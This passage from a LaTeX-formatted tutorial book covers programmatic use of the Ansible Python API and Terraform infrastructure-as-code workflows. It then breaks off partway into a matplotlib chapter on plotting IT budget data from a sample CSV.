  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Ansible}\label{introduction-to-ansible}

Ansible is an open-source automation tool used for IT tasks such as
configuration management, application deployment, and task automation.
It uses a simple, human-readable language to describe automation jobs,
making it easy to learn and use.

\section{Installing Ansible and the Python
API}\label{installing-ansible-and-the-python-api}

To get started, you'll need to install Ansible and the Ansible Python
API. You can install Ansible using \texttt{pip}.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install ansible}
\end{Highlighting}
\end{Shaded}

To use the Ansible Python API, you also need to install
\texttt{ansible-base}.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install ansible{-}base}
\end{Highlighting}
\end{Shaded}

\section{Setting Up Your Environment}\label{setting-up-your-environment}

Before you start using Ansible, you'll need to set up your environment.
This includes creating an inventory file that lists the hosts you want
to manage and a configuration file to define various settings.

\subsection{Inventory File}\label{inventory-file}

Ansible uses an inventory file to keep track of the hosts it manages.
Here's an example of a simple inventory file:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{[webservers]}
\DataTypeTok{web1.example.com}
\DataTypeTok{web2.example.com}

\KeywordTok{[databases]}
\DataTypeTok{db1.example.com}
\DataTypeTok{db2.example.com}
\end{Highlighting}
\end{Shaded}

\subsection{Configuration File}\label{configuration-file}

Ansible configuration file (ansible.cfg) contains various settings that
control the behavior of Ansible. Here is a basic example:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{[defaults]}
\DataTypeTok{inventory }\OtherTok{=}\StringTok{ ./inventory}
\DataTypeTok{remote\_user }\OtherTok{=}\StringTok{ your\_user}
\DataTypeTok{host\_key\_checking }\OtherTok{=}\StringTok{ }\KeywordTok{False}
\end{Highlighting}
\end{Shaded}

\section{Basic Concepts of Ansible}\label{basic-concepts-of-ansible}

Before diving into the Python API, let's review some basic concepts of
Ansible.

\begin{itemize}
\tightlist
\item
  \textbf{Playbooks}: YAML files that define a series of tasks to be
  executed on the managed hosts.
\item
  \textbf{Modules}: Reusable, standalone scripts that Ansible runs on
  your behalf.
\item
  \textbf{Tasks}: Actions executed on the managed hosts.
\item
  \textbf{Roles}: A way to group multiple tasks together to organize
  playbooks.
\end{itemize}

\section{Using the Ansible Python
API}\label{using-the-ansible-python-api}

The Ansible Python API allows you to interact with Ansible
programmatically. This section covers how to use the API to run ad-hoc
commands, execute playbooks, and manage inventory.

\subsection{Running Ad-Hoc Commands}\label{running-ad-hoc-commands}

Ad-hoc commands allow you to run simple commands on your managed hosts
without writing a playbook.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ ansible.executor.task\_queue\_manager }\ImportTok{import}\NormalTok{ TaskQueueManager}
\ImportTok{from}\NormalTok{ ansible.parsing.dataloader }\ImportTok{import}\NormalTok{ DataLoader}
\ImportTok{from}\NormalTok{ ansible.inventory.manager }\ImportTok{import}\NormalTok{ InventoryManager}
\ImportTok{from}\NormalTok{ ansible.}\BuiltInTok{vars}\NormalTok{.manager }\ImportTok{import}\NormalTok{ VariableManager}
\ImportTok{from}\NormalTok{ ansible.playbook.play }\ImportTok{import}\NormalTok{ Play}
\ImportTok{from}\NormalTok{ ansible }\ImportTok{import}\NormalTok{ context}
\ImportTok{from}\NormalTok{ ansible.module\_utils.common.collections }\ImportTok{import}\NormalTok{ ImmutableDict}
\ImportTok{import}\NormalTok{ ansible.constants }\ImportTok{as}\NormalTok{ C}

\NormalTok{context.CLIARGS }\OperatorTok{=}\NormalTok{ ImmutableDict(connection}\OperatorTok{=}\StringTok{\textquotesingle{}ssh\textquotesingle{}}\NormalTok{, module\_path}\OperatorTok{=}\NormalTok{[], forks}\OperatorTok{=}\DecValTok{10}\NormalTok{, become}\OperatorTok{=}\VariableTok{None}\NormalTok{, become\_method}\OperatorTok{=}\VariableTok{None}\NormalTok{, become\_user}\OperatorTok{=}\VariableTok{None}\NormalTok{, check}\OperatorTok{=}\VariableTok{False}\NormalTok{, diff}\OperatorTok{=}\VariableTok{False}\NormalTok{)}

\CommentTok{\# Initialize required objects}
\NormalTok{loader }\OperatorTok{=}\NormalTok{ DataLoader()  }\CommentTok{\# Takes care of finding and reading yaml, json and ini files}
\NormalTok{inventory }\OperatorTok{=}\NormalTok{ InventoryManager(loader}\OperatorTok{=}\NormalTok{loader, sources}\OperatorTok{=}\StringTok{\textquotesingle{}inventory\textquotesingle{}}\NormalTok{)}
\NormalTok{variable\_manager }\OperatorTok{=}\NormalTok{ VariableManager(loader}\OperatorTok{=}\NormalTok{loader, inventory}\OperatorTok{=}\NormalTok{inventory)}

\CommentTok{\# Create a play source}
\NormalTok{play\_source }\OperatorTok{=} \BuiltInTok{dict}\NormalTok{(}
\NormalTok{    name}\OperatorTok{=}\StringTok{"Ansible Ad{-}Hoc"}\NormalTok{,}
\NormalTok{    hosts}\OperatorTok{=}\StringTok{\textquotesingle{}webservers\textquotesingle{}}\NormalTok{,}
\NormalTok{    gather\_facts}\OperatorTok{=}\StringTok{\textquotesingle{}no\textquotesingle{}}\NormalTok{,}
\NormalTok{    tasks}\OperatorTok{=}\NormalTok{[}
        \BuiltInTok{dict}\NormalTok{(action}\OperatorTok{=}\BuiltInTok{dict}\NormalTok{(module}\OperatorTok{=}\StringTok{\textquotesingle{}shell\textquotesingle{}}\NormalTok{, args}\OperatorTok{=}\StringTok{\textquotesingle{}uptime\textquotesingle{}}\NormalTok{), register}\OperatorTok{=}\StringTok{\textquotesingle{}shell\_out\textquotesingle{}}\NormalTok{),}
\NormalTok{    ]}
\NormalTok{)}

\CommentTok{\# Create Play object, which constructs our play from play source}
\NormalTok{play }\OperatorTok{=}\NormalTok{ Play().load(play\_source, variable\_manager}\OperatorTok{=}\NormalTok{variable\_manager, loader}\OperatorTok{=}\NormalTok{loader)}

\CommentTok{\# Run it}
\NormalTok{tqm }\OperatorTok{=} \VariableTok{None}
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    tqm }\OperatorTok{=}\NormalTok{ TaskQueueManager(}
\NormalTok{              inventory}\OperatorTok{=}\NormalTok{inventory,}
\NormalTok{              variable\_manager}\OperatorTok{=}\NormalTok{variable\_manager,}
\NormalTok{              loader}\OperatorTok{=}\NormalTok{loader,}
\NormalTok{              passwords}\OperatorTok{=}\BuiltInTok{dict}\NormalTok{(vault\_pass}\OperatorTok{=}\StringTok{\textquotesingle{}secret\textquotesingle{}}\NormalTok{),}
\NormalTok{              stdout\_callback}\OperatorTok{=}\StringTok{\textquotesingle{}default\textquotesingle{}}\NormalTok{,}
\NormalTok{          )}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ tqm.run(play)  }\CommentTok{\# most interesting data for a play is actually sent to the callback\textquotesingle{}s methods}
\ControlFlowTok{finally}\NormalTok{:}
    \ControlFlowTok{if}\NormalTok{ tqm }\KeywordTok{is} \KeywordTok{not} \VariableTok{None}\NormalTok{:}
\NormalTok{        tqm.cleanup()}
\end{Highlighting}
\end{Shaded}

\subsection{Running Playbooks}\label{running-playbooks}

Playbooks are the core of Ansible's configuration, deployment, and
orchestration language.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ ansible.executor.playbook\_executor }\ImportTok{import}\NormalTok{ PlaybookExecutor}

\NormalTok{playbooks }\OperatorTok{=}\NormalTok{ [}\StringTok{\textquotesingle{}site.yml\textquotesingle{}}\NormalTok{]  }\CommentTok{\# your playbook file}

\CommentTok{\# Create PlaybookExecutor}
\NormalTok{executor }\OperatorTok{=}\NormalTok{ PlaybookExecutor(}
\NormalTok{    playbooks}\OperatorTok{=}\NormalTok{playbooks,}
\NormalTok{    inventory}\OperatorTok{=}\NormalTok{inventory,}
\NormalTok{    variable\_manager}\OperatorTok{=}\NormalTok{variable\_manager,}
\NormalTok{    loader}\OperatorTok{=}\NormalTok{loader,}
\NormalTok{    passwords}\OperatorTok{=}\BuiltInTok{dict}\NormalTok{(vault\_pass}\OperatorTok{=}\StringTok{\textquotesingle{}secret\textquotesingle{}}\NormalTok{)}
\NormalTok{)}

\CommentTok{\# Run the playbook}
\NormalTok{executor.run()}
\end{Highlighting}
\end{Shaded}

\subsection{Managing Inventory}\label{managing-inventory}

Managing inventory programmatically allows dynamic inventory generation
and management.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ ansible.inventory.manager }\ImportTok{import}\NormalTok{ InventoryManager}

\NormalTok{inventory }\OperatorTok{=}\NormalTok{ InventoryManager(loader}\OperatorTok{=}\NormalTok{loader, sources}\OperatorTok{=}\StringTok{\textquotesingle{}inventory\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Advanced Usage}\label{advanced-usage-3}

\subsection{Custom Modules}\label{custom-modules}

Custom modules extend Ansible's functionality. Here is an example of
creating a custom module.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ ansible.module\_utils.basic }\ImportTok{import}\NormalTok{ AnsibleModule}

\KeywordTok{def}\NormalTok{ run\_module():}
\NormalTok{    module\_args }\OperatorTok{=} \BuiltInTok{dict}\NormalTok{(}
\NormalTok{        name}\OperatorTok{=}\BuiltInTok{dict}\NormalTok{(}\BuiltInTok{type}\OperatorTok{=}\StringTok{\textquotesingle{}str\textquotesingle{}}\NormalTok{, required}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\NormalTok{    )}

\NormalTok{    result }\OperatorTok{=} \BuiltInTok{dict}\NormalTok{(}
\NormalTok{        changed}\OperatorTok{=}\VariableTok{False}\NormalTok{,}
\NormalTok{        original\_message}\OperatorTok{=}\StringTok{\textquotesingle{}\textquotesingle{}}\NormalTok{,}
\NormalTok{        message}\OperatorTok{=}\StringTok{\textquotesingle{}\textquotesingle{}}
\NormalTok{    )}

\NormalTok{    module }\OperatorTok{=}\NormalTok{ AnsibleModule(}
\NormalTok{        argument\_spec}\OperatorTok{=}\NormalTok{module\_args,}
\NormalTok{        supports\_check\_mode}\OperatorTok{=}\VariableTok{True}
\NormalTok{    )}

\NormalTok{    name }\OperatorTok{=}\NormalTok{ module.params[}\StringTok{\textquotesingle{}name\textquotesingle{}}\NormalTok{]}
\NormalTok{    result[}\StringTok{\textquotesingle{}original\_message\textquotesingle{}}\NormalTok{] }\OperatorTok{=}\NormalTok{ name}
\NormalTok{    result[}\StringTok{\textquotesingle{}message\textquotesingle{}}\NormalTok{] }\OperatorTok{=} \StringTok{\textquotesingle{}Hello, }\SpecialCharTok{\{0\}}\StringTok{!\textquotesingle{}}\NormalTok{.}\BuiltInTok{format}\NormalTok{(name)}

\NormalTok{    module.exit\_json(}\OperatorTok{**}\NormalTok{result)}

\KeywordTok{def}\NormalTok{ main():}
\NormalTok{    run\_module()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    main()}
\end{Highlighting}
\end{Shaded}

\subsection{Callbacks}\label{callbacks}

Callbacks allow custom handling of events during the execution of
playbooks and tasks.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ ansible.plugins.callback }\ImportTok{import}\NormalTok{ CallbackBase}

\KeywordTok{class}\NormalTok{ ResultCallback(CallbackBase):}
    \KeywordTok{def}\NormalTok{ v2\_runner\_on\_ok(}\VariableTok{self}\NormalTok{, result):}
\NormalTok{        host }\OperatorTok{=}\NormalTok{ result.\_host}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{host}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{: }\SpecialCharTok{\{}\NormalTok{result}\SpecialCharTok{.}\NormalTok{\_result}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Use the custom callback in TaskQueueManager or PlaybookExecutor}
\NormalTok{tqm }\OperatorTok{=}\NormalTok{ TaskQueueManager(}
\NormalTok{    inventory}\OperatorTok{=}\NormalTok{inventory,}
\NormalTok{    variable\_manager}\OperatorTok{=}\NormalTok{variable\_manager,}
\NormalTok{    loader}\OperatorTok{=}\NormalTok{loader,}
\NormalTok{    passwords}\OperatorTok{=}\BuiltInTok{dict}\NormalTok{(vault\_pass}\OperatorTok{=}\StringTok{\textquotesingle{}secret\textquotesingle{}}\NormalTok{),}
\NormalTok{    stdout\_callback}\OperatorTok{=}\NormalTok{ResultCallback(),  }\CommentTok{\# Use custom callback}
\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Handling Results}\label{handling-results}

Handling results allows you to capture and process the output of your
tasks and playbooks.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ ResultCallback(CallbackBase):}
    \KeywordTok{def}\NormalTok{ v2\_runner\_on\_ok(}\VariableTok{self}\NormalTok{, result):}
\NormalTok{        host }\OperatorTok{=}\NormalTok{ result.\_host}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{host}\SpecialCharTok{.}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{: }\SpecialCharTok{\{}\NormalTok{result}\SpecialCharTok{.}\NormalTok{\_result}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{callback }\OperatorTok{=}\NormalTok{ ResultCallback()}

\CommentTok{\# Pass the callback to the TaskQueueManager or PlaybookExecutor}
\NormalTok{tqm }\OperatorTok{=}\NormalTok{ TaskQueueManager(}
\NormalTok{    inventory}\OperatorTok{=}\NormalTok{inventory,}
\NormalTok{    variable\_manager}\OperatorTok{=}\NormalTok{variable\_manager,}
\NormalTok{    loader}\OperatorTok{=}\NormalTok{loader,}
\NormalTok{    passwords}\OperatorTok{=}\BuiltInTok{dict}\NormalTok{(vault\_pass}\OperatorTok{=}\StringTok{\textquotesingle{}secret\textquotesingle{}}\NormalTok{),}
\NormalTok{    stdout\_callback}\OperatorTok{=}\NormalTok{callback,}
\NormalTok{)}

\CommentTok{\# Run the play}
\NormalTok{tqm.run(play)}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-51}

This deep dive tutorial has covered the basics and some advanced
features of using the Ansible Python API for infrastructure management.
You should now have a good understanding of how to use Ansible
programmatically to manage your infrastructure, including running ad-hoc
commands, executing playbooks, managing inventory, creating custom
modules, and handling results. With this knowledge, you can automate and
orchestrate complex IT tasks efficiently.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial on Terraform for Infrastructure
Management}\label{deep-dive-tutorial-on-terraform-for-infrastructure-management}

Terraform is a powerful tool used for infrastructure as code (IaC),
allowing users to define and provision infrastructure using a high-level
configuration language. This tutorial will provide a comprehensive guide
to using Terraform for infrastructure management.

\section{Table of Contents}\label{table-of-contents-22}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-terraform]{Introduction to Terraform}
\item
  \hyperref[installing-terraform]{Installing Terraform}
\item
  \hyperref[setting-up-your-first-terraform-project]{Setting Up Your
  First Terraform Project}
\item
  \hyperref[understanding-terraform-configuration-files]{Understanding
  Terraform Configuration Files}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[providers]{Providers}
  \item
    \hyperref[resources]{Resources}
  \item
    \hyperref[variables]{Variables}
  \item
    \hyperref[outputs]{Outputs}
  \end{itemize}
\item
  \hyperref[terraform-workflow]{Terraform Workflow}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[initializing]{Initializing}
  \item
    \hyperref[planning]{Planning}
  \item
    \hyperref[applying]{Applying}
  \item
    \hyperref[destroying]{Destroying}
  \end{itemize}
\item
  \hyperref[state-management]{State Management}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[remote-state]{Remote State}
  \item
    \hyperref[state-locking]{State Locking}
  \end{itemize}
\item
  \hyperref[modules]{Modules}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[creating-modules]{Creating Modules}
  \item
    \hyperref[using-modules]{Using Modules}
  \end{itemize}
\item
  \hyperref[provisioners]{Provisioners}
\item
  \hyperref[terraform-best-practices]{Terraform Best Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Terraform}\label{introduction-to-terraform}

Terraform is an open-source infrastructure as code (IaC) tool created by
HashiCorp. It allows you to define both cloud and on-premises resources
using a high-level configuration language. Terraform can manage
resources across various cloud providers and services through its
extensive provider ecosystem.

\section{Installing Terraform}\label{installing-terraform}

To get started with Terraform, you need to install it on your local
machine. Follow the steps below to install Terraform.

\subsection{Installation on Windows}\label{installation-on-windows}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Download the appropriate package for your system from the
  \href{https://www.terraform.io/downloads.html}{Terraform downloads
  page}.
\item
  Extract the package to a directory of your choice.
\item
  Add the directory to your system's PATH environment variable.
\end{enumerate}

\subsection{Installation on macOS}\label{installation-on-macos}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Use Homebrew to install Terraform:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{brew}\NormalTok{ install terraform}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\subsection{Installation on Linux}\label{installation-on-linux}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Download the appropriate package for your system from the
  \href{https://www.terraform.io/downloads.html}{Terraform downloads
  page}.
\item
  Extract the package to \texttt{/usr/local/bin}:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ unzip terraform\_}\OperatorTok{\textless{}}\NormalTok{VERSION}\OperatorTok{\textgreater{}}\NormalTok{\_linux\_amd64.zip }\AttributeTok{{-}d}\NormalTok{ /usr/local/bin/}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

Verify the installation by running:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{terraform} \AttributeTok{{-}version}
\end{Highlighting}
\end{Shaded}

\section{Setting Up Your First Terraform
Project}\label{setting-up-your-first-terraform-project}

Create a new directory for your Terraform project and navigate into it:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{mkdir}\NormalTok{ my{-}terraform{-}project}
\BuiltInTok{cd}\NormalTok{ my{-}terraform{-}project}
\end{Highlighting}
\end{Shaded}

Create a new Terraform configuration file:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{touch}\NormalTok{ main.tf}
\end{Highlighting}
\end{Shaded}

\section{Understanding Terraform Configuration
Files}\label{understanding-terraform-configuration-files}

Terraform configuration files are written in HashiCorp Configuration
Language (HCL) or JSON. These files define the resources and
infrastructure you want to manage.

\subsection{Providers}\label{providers}

Providers are plugins that enable Terraform to interact with cloud
providers, SaaS providers, and other APIs. Here's how to configure the
AWS provider:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{provider "aws" \{}
\NormalTok{  region = "us{-}west{-}2"}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\subsection{Resources}\label{resources}

Resources are the most important element in the Terraform language. Each
resource block describes one or more infrastructure objects.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{resource "aws\_instance" "example" \{}
\NormalTok{  ami           = "ami{-}0c55b159cbfafe1f0"}
\NormalTok{  instance\_type = "t2.micro"}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\subsection{Variables}\label{variables-1}

Variables allow you to parameterize your Terraform configurations. You
can define variables in a \texttt{variables.tf} file:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{variable "instance\_type" \{}
\NormalTok{  description = "Type of instance to create"}
\NormalTok{  default     = "t2.micro"}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\subsection{Outputs}\label{outputs}

Outputs are a way to extract information from your Terraform state and
make it accessible for other parts of your configuration or for user
reference.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{output "instance\_ip" \{}
\NormalTok{  value = aws\_instance.example.public\_ip}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\section{Terraform Workflow}\label{terraform-workflow}

\subsection{Initializing}\label{initializing}

Initialize a working directory containing Terraform configuration files:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{terraform}\NormalTok{ init}
\end{Highlighting}
\end{Shaded}

\subsection{Planning}\label{planning}

Generate and show an execution plan:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{terraform}\NormalTok{ plan}
\end{Highlighting}
\end{Shaded}

\subsection{Applying}\label{applying}

Build or change infrastructure:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{terraform}\NormalTok{ apply}
\end{Highlighting}
\end{Shaded}

\subsection{Destroying}\label{destroying}

Destroy the infrastructure managed by Terraform:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{terraform}\NormalTok{ destroy}
\end{Highlighting}
\end{Shaded}

\section{State Management}\label{state-management}

Terraform uses a state file to keep track of the resources it manages.
This state file is critical for tracking resource changes and ensuring
that your infrastructure matches your configuration.

\subsection{Remote State}\label{remote-state}

Storing your state file remotely is essential for collaboration and
preventing conflicts.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{terraform \{}
\NormalTok{  backend "s3" \{}
\NormalTok{    bucket = "my{-}terraform{-}state"}
\NormalTok{    key    = "state/terraform.tfstate"}
\NormalTok{    region = "us{-}west{-}2"}
\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\subsection{State Locking}\label{state-locking}

State locking prevents concurrent operations, which can cause
corruption. S3 backend supports state locking using DynamoDB.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{terraform \{}
\NormalTok{  backend "s3" \{}
\NormalTok{    bucket         = "my{-}terraform{-}state"}
\NormalTok{    key            = "state/terraform.tfstate"}
\NormalTok{    region         = "us{-}west{-}2"}
\NormalTok{    dynamodb\_table = "terraform{-}lock"}
\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\section{Modules}\label{modules}

Modules are self-contained packages of Terraform configurations that can
be shared and reused.

\subsection{Creating Modules}\label{creating-modules-1}

Create a directory for your module:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{mkdir} \AttributeTok{{-}p}\NormalTok{ modules/my{-}module}
\end{Highlighting}
\end{Shaded}

Define resources, variables, and outputs within this directory.

\subsection{Using Modules}\label{using-modules}

Use the module in your main configuration:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{module "my\_module" \{}
\NormalTok{  source = "./modules/my{-}module"}

\NormalTok{  \# Pass variables to the module}
\NormalTok{  instance\_type = "t2.micro"}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\section{Provisioners}\label{provisioners}

Provisioners allow you to execute scripts on a local or remote machine
as part of the resource lifecycle.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{resource "aws\_instance" "example" \{}
\NormalTok{  ami           = "ami{-}0c55b159cbfafe1f0"}
\NormalTok{  instance\_type = "t2.micro"}

\NormalTok{  provisioner "local{-}exec" \{}
\NormalTok{    command = "echo $\{aws\_instance.example.public\_ip\}"}
\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\section{Terraform Best Practices}\label{terraform-best-practices}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Use Version Control}: Keep your Terraform configurations in a
  version control system like Git.
\item
  \textbf{Modularize Configurations}: Use modules to organize and reuse
  configurations.
\item
  \textbf{State Management}: Use remote state and state locking to avoid
  conflicts.
\item
  \textbf{Environment Separation}: Use workspaces or separate state
  files for different environments (e.g., development, staging,
  production).
\item
  \textbf{Sensitive Data}: Use environment variables or secret
  management tools to handle sensitive data securely.
\end{enumerate}

\section{Conclusion}\label{conclusion-52}

This deep dive tutorial has covered the basics and some advanced
features of using Terraform for infrastructure management. You should
now have a good understanding of how to define, manage, and provision
infrastructure using Terraform. With this knowledge, you can automate
your infrastructure tasks and manage your resources efficiently.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive Tutorial for Visualizing IT Budget
Data with
\texttt{matplotlib}}{Deep Dive Tutorial for Visualizing IT Budget Data with matplotlib}}\label{deep-dive-tutorial-for-visualizing-it-budget-data-with-matplotlib}

\texttt{matplotlib} is a powerful and versatile library in Python for
creating static, animated, and interactive visualizations. In this
tutorial, we will focus on visualizing IT budget data using
\texttt{matplotlib}. We will cover various types of charts and plots
that can help in effectively communicating IT budget information.

\section{Table of Contents}\label{table-of-contents-23}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-matplotlib]{Introduction to
  \texttt{matplotlib}}
\item
  \hyperref[installing-matplotlib]{Installing \texttt{matplotlib}}
\item
  \hyperref[loading-it-budget-data]{Loading IT Budget Data}
\item
  \hyperref[basic-plotting]{Basic Plotting}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[line-plot]{Line Plot}
  \item
    \hyperref[bar-chart]{Bar Chart}
  \item
    \hyperref[pie-chart]{Pie Chart}
  \end{itemize}
\item
  \hyperref[advanced-visualizations]{Advanced Visualizations}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[stacked-bar-chart]{Stacked Bar Chart}
  \item
    \hyperref[box-plot]{Box Plot}
  \item
    \hyperref[heatmap]{Heatmap}
  \end{itemize}
\item
  \hyperref[customizing-plots]{Customizing Plots}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[titles-and-labels]{Titles and Labels}
  \item
    \hyperref[legends]{Legends}
  \item
    \hyperref[annotations]{Annotations}
  \end{itemize}
\item
  \hyperref[saving-plots]{Saving Plots}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{\texorpdfstring{Introduction to
\texttt{matplotlib}}{Introduction to matplotlib}}\label{introduction-to-matplotlib}

\texttt{matplotlib} is a comprehensive library for creating static,
animated, and interactive visualizations in Python. It is highly
customizable and integrates well with other libraries such as
\texttt{numpy} and \texttt{pandas}.

\section{\texorpdfstring{Installing
\texttt{matplotlib}}{Installing matplotlib}}\label{installing-matplotlib}

To install \texttt{matplotlib}, use \texttt{pip}:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install matplotlib}
\end{Highlighting}
\end{Shaded}

\section{Loading IT Budget Data}\label{loading-it-budget-data}

For this tutorial, we will assume that IT budget data is stored in a CSV
file. We'll use \texttt{pandas} to load and handle the data.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pandas }\ImportTok{as}\NormalTok{ pd}

\CommentTok{\# Load the data}
\NormalTok{data }\OperatorTok{=}\NormalTok{ pd.read\_csv(}\StringTok{\textquotesingle{}it\_budget.csv\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(data.head())}
\end{Highlighting}
\end{Shaded}

Sample IT budget data (\texttt{it\_budget.csv}):

\begin{verbatim}
Year,Hardware,Software,Services,Personnel
2018,50000,30000,15000,60000
2019,55000,32000,18000,63000
2020,60000,34000,20000,66000
2021,62000,36000,22000,70000
2022,65000,38000,25000,73000
\end{verbatim}

\section{Basic Plotting}\label{basic-plotting}

\subsection{Line Plot}\label{line-plot}

A line plot is useful for visualizing trends over time. Here, we'll plot
the IT budget over the years.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ matplotlib.pyplot }\ImportTok{as}\NormalTok{ plt}

\NormalTok{plt.figure(figsize}\OperatorTok{=}\NormalTok{(}\DecValTok{10}\NormalTok{, }\DecValTok{6}\NormalTok{))}
\NormalTok{plt.plot(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.plot(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Software\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Software\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.plot(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Services\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Services\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.plot(data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{], data[}\StringTok{\textquotesingle{}Personnel\textquotesingle{}}\NormalTok{], label}\OperatorTok{=}\StringTok{\textquotesingle{}Personnel\textquotesingle{}}\NormalTok{)}

\NormalTok{plt.xlabel(}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.ylabel(}\StringTok{\textquotesingle{}Budget ($)\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.title(}\StringTok{\textquotesingle{}IT Budget Over Years\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.legend()}
\NormalTok{plt.grid(}\VariableTok{True}\NormalTok{)}
\NormalTok{plt.show()}
\end{Highlighting}
\end{Shaded}

\subsection{Bar Chart}\label{bar-chart}

A bar chart can effectively show the budget distribution for different
categories in a particular year.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{year }\OperatorTok{=} \DecValTok{2022}
\NormalTok{budget\_2022 }\OperatorTok{=}\NormalTok{ data[data[}\StringTok{\textquotesingle{}Year\textquotesingle{}}\NormalTok{] }\OperatorTok{==}\NormalTok{ year].iloc[}\DecValTok{0}\NormalTok{, }\DecValTok{1}\NormalTok{:]}

\NormalTok{plt.figure(figsize}\OperatorTok{=}\NormalTok{(}\DecValTok{10}\NormalTok{, }\DecValTok{6}\NormalTok{))}
